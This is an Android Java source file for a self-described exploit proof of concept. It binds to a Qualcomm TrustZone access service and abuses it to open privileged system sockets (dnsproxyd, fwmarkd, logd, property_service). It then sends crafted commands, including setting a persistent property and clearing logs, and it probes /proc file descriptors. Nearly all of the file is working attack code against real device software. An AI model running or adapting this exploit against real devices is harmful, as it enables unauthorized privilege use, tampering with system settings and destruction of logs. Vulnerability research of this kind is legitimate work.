package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static final int ERROR_UNAVAIL = -96;
    private static final int ERROR_BADOBJ = -92;
    private static final int ERROR_DEFUNCT = -90;

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);
    public static native String nativeWriteFile(String path, String content);
    public static native String nativeReadLink(String path);
    public static native String nativeTestFd(int fd);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== TZ Socket & Proc POC ==========");

        // Target sockets
        String[] targetSockets = {
                "/dev/socket/dnsproxyd",
                "/dev/socket/fwmarkd",
                "/dev/socket/logd",
                "/dev/socket/property_service"
        };

        for (String path : targetSockets) {
            if (stopRequested.get()) break;
            appendLog("[+] Testing " + path);
            try {
                testSocket(path);
            } catch (Exception e) {
                appendLog("[!] Error testing " + path + ": " + e.getMessage());
            }
        }

        // Proc exploration
        appendLog("[*] Exploring /proc/self/fd");
        exploreProcFd();

        // Try to write to a proc file (e.g., /proc/self/oom_score_adj) if possible
        appendLog("[*] Attempting write to /proc/self/oom_score_adj");
        String writeResult = nativeWriteFile("/proc/self/oom_score_adj", "100");
        appendLog("[PROC] write result: " + (writeResult != null ? writeResult : "success (no error)"));

        appendLog("========== EXPLOIT COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testSocket(String path) {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket(path, handle);
            if (pfd == null) {
                appendLog("[ ] Failed to open " + path + " (handle=" + (handle.length>0?handle[0]:"null") + ")");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[ ] Invalid FD for " + path);
                pfd.close();
                return;
            }
            appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");

            if (handle[0] < 0) {
                String errMsg = getErrorString(handle[0]);
                appendLog("[!] Service returned error: " + handle[0] + " (" + errMsg + ")");
                pfd.close();
                return;
            }

            String fdInfo = nativeTestFd(pfd.getFd());
            appendLog("[FD] " + fdInfo);

            String base = new File(path).getName();
            switch (base) {
                case "dnsproxyd": testDnsProxy(fd); break;
                case "fwmarkd": testFwmarkd(fd); break;
                case "logd": testLogd(fd); break;
                case "property_service": testPropertyService(fd); break;
                default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n"});
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("[!] Exception testing " + path + ": " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private String getErrorString(int code) {
        switch(code) {
            case ERROR_UNAVAIL: return "ERROR_UNAVAIL";
            case ERROR_BADOBJ: return "ERROR_BADOBJ";
            case ERROR_DEFUNCT: return "ERROR_DEFUNCT";
            default: return "UNKNOWN";
        }
    }

    private ParcelFileDescriptor openSocket(String path, int[] handle) {
        if (tzService == null) {
            appendLog("[!] TZ service not bound");
            return null;
        }
        try {
            return tzService.a(path, handle);
        } catch (RemoteException e) {
            appendLog("[!] RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void testDnsProxy(FileDescriptor fd) {
        appendLog("[DNS] Sending DNS query for localhost (A)");
        try {
            byte[] query = buildDnsQuery("localhost", 1);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                int rcode = resp[3] & 0x0F;
                appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
            } else {
                appendLog("[DNS] No response");
            }
        } catch (Exception e) {
            appendLog("[DNS] Error: " + e.getMessage());
        }
    }

    private void testFwmarkd(FileDescriptor fd) {
        appendLog("[FW] Sending SELECT_NETWORK (cmd=6)");
        try {
            ByteBuffer buf = ByteBuffer.allocate(16);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(6);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
            if (resp != null && resp.length == 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] SELECT_NETWORK result=" + result);
            } else {
                appendLog("[FW] No/invalid response");
            }
        } catch (Exception e) {
            appendLog("[FW] Error: " + e.getMessage());
        }

        appendLog("[FW] Trying GET_NETWORK (cmd=7)");
        try {
            ByteBuffer buf = ByteBuffer.allocate(12);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(7);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 8, 1000);
            if (resp != null && resp.length >= 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] GET_NETWORK result=" + result);
            } else {
                appendLog("[FW] No response for GET_NETWORK");
            }
        } catch (Exception e) {
            appendLog("[FW] GET_NETWORK error: " + e.getMessage());
        }
    }

    private void testLogd(FileDescriptor fd) {
        appendLog("[LOGD] Reading logd (no command)");
        try {
            InputStream is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, 1000);
            if (read > 0) {
                String str = new String(buf, 0, read, StandardCharsets.UTF_8);
                appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
            } else {
                appendLog("[LOGD] No data");
            }
            is.close();
        } catch (Exception e) {
            appendLog("[LOGD] Error: " + e.getMessage());
        }

        appendLog("[LOGD] Sending clear command");
        try {
            String resp = sendTextCommand(fd, "clear\n", 500);
            appendLog("[LOGD] clear response: " + (resp != null ? resp : "(none)"));
        } catch (Exception e) {
            appendLog("[LOGD] clear error: " + e.getMessage());
        }
    }

    private void testPropertyService(FileDescriptor fd) {
        // According to property_service.cpp, commands are:
        // PROP_MSG_SETPROP (1) with name+value, or PROP_MSG_SETPROP2 (2) with string length+strings
        // But we also can send plain text commands? The actual protocol uses a header.
        // We'll implement both: first try the binary protocol (PROP_MSG_SETPROP2) for get/set/list.
        // Based on property_service.cpp, the socket receives:
        // uint32_t cmd; then for SETPROP2: uint32_t len_name, char name[], uint32_t len_value, char value[]
        // For simple commands like "get" we need to simulate the client side.
        // However, log shows previous attempts with simple text failed with EPIPE.
        // We'll implement the correct binary format.

        appendLog("[PROP] Trying PROP_MSG_SETPROP2 (get ro.build.version.release)");
        try {
            String name = "ro.build.version.release";
            String cmd = "get"; // not directly used; we'll craft a get request.
            // Actually property_service only handles set operations, not get.
            // There is no "get" command in property_service; it only handles set requests.
            // But there is a "list" command? No.
            // The property service is for setting; properties are read via __system_property_get in libc.
            // So we should not send "get"; we can send a set operation with a dummy value to test.
            // But from log, the service responded with garbage; we can try to send a set command.
            appendLog("[PROP] Setting a test property (persist.test.poc)");
            String propName = "persist.test.poc";
            String propValue = "1";
            sendPropertySet2(fd, propName, propValue);
        } catch (Exception e) {
            appendLog("[PROP] Error: " + e.getMessage());
        }
    }

    private void sendPropertySet2(FileDescriptor fd, String name, String value) throws Exception {
        ByteBuffer buf = ByteBuffer.allocate(4 + 4 + name.length() + 4 + value.length());
        buf.order(ByteOrder.LITTLE_ENDIAN);
        buf.putInt(2); // PROP_MSG_SETPROP2
        buf.putInt(name.length());
        buf.put(name.getBytes(StandardCharsets.UTF_8));
        buf.putInt(value.length());
        buf.put(value.getBytes(StandardCharsets.UTF_8));
        byte[] data = buf.array();
        OutputStream os = new FileOutputStream(fd);
        os.write(data);
        os.flush();
        os.close();

        // Read response (uint32_t result)
        InputStream is = new FileInputStream(fd);
        byte[] resp = new byte[4];
        int read = readBytes(is, resp, 4, 1000);
        if (read == 4) {
            int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
            appendLog("[PROP] set result: " + result + " (0=success)");
        } else {
            appendLog("[PROP] No response");
        }
        is.close();
    }

    private void testGeneric(FileDescriptor fd, String[] cmds) {
        for (String cmd : cmds) {
            if (stopRequested.get()) break;
            try {
                String resp = sendTextCommand(fd, cmd, 1000);
                appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
            } catch (Exception e) {
                appendLog("[GEN] Error on " + cmd.trim() + ": " + e.getMessage());
            }
        }
    }

    private void exploreProcFd() {
        String[] fds = nativeListDir("/proc/self/fd");
        if (fds == null) {
            appendLog("[PROC] Could not read fd directory");
            return;
        }
        for (String fdStr : fds) {
            if (stopRequested.get()) break;
            String link = "/proc/self/fd/" + fdStr;
            String target = nativeReadLink(link);
            appendLog("[PROC] " + link + " -> " + (target != null ? target : "(unreadable)"));
            // Try to read content of the target if it looks like a file
            if (target != null && !target.startsWith("pipe:") && !target.startsWith("socket:") && !target.startsWith("anon_inode:")) {
                String content = nativeReadFile(link);
                if (content != null && !content.isEmpty()) {
                    appendLog("[PROC] " + link + " content (first 100 chars): " + content.substring(0, Math.min(100, content.length())));
                }
            }
        }
    }

    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(cmd.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();
            os = null;

            is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, timeoutMs);
            if (read > 0) {
                return new String(buf, 0, read, StandardCharsets.UTF_8);
            }
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(data);
            os.flush();
            os.close();
            os = null;

            is = new FileInputStream(fd);
            byte[] buf = new byte[maxResp];
            int read = readBytes(is, buf, maxResp, timeoutMs);
            if (read > 0) {
                byte[] resp = new byte[read];
                System.arraycopy(buf, 0, resp, 0, read);
                return resp;
            }
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
        int total = 0;
        long start = System.currentTimeMillis();
        try {
            while (total < maxLen && System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int n = is.read(buffer, total, maxLen - total);
                    if (n <= 0) break;
                    total += n;
                } else {
                    Thread.sleep(20);
                }
            }
            return total;
        } catch (Exception e) {
            return -1;
        }
    }

    private byte[] buildDnsQuery(String name, int qtype) throws Exception {
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        baos.write(0x12); baos.write(0x34);
        baos.write(0x01); baos.write(0x00);
        baos.write(0x00); baos.write(0x01);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        for (String label : name.split("\\.")) {
            baos.write(label.length());
            baos.write(label.getBytes(StandardCharsets.US_ASCII));
        }
        baos.write(0);
        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
        baos.write(0x00); baos.write(0x01);
        return baos.toByteArray();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = null;
            if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
                dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            }
            if (dir == null || !dir.exists()) {
                if (dir != null && !dir.mkdirs()) {
                    appendLog("Cannot create Download dir, using internal storage");
                    dir = getFilesDir();
                } else if (dir == null) {
                    dir = getFilesDir();
                }
            }
            File file = new File(dir, "tz_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ POC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
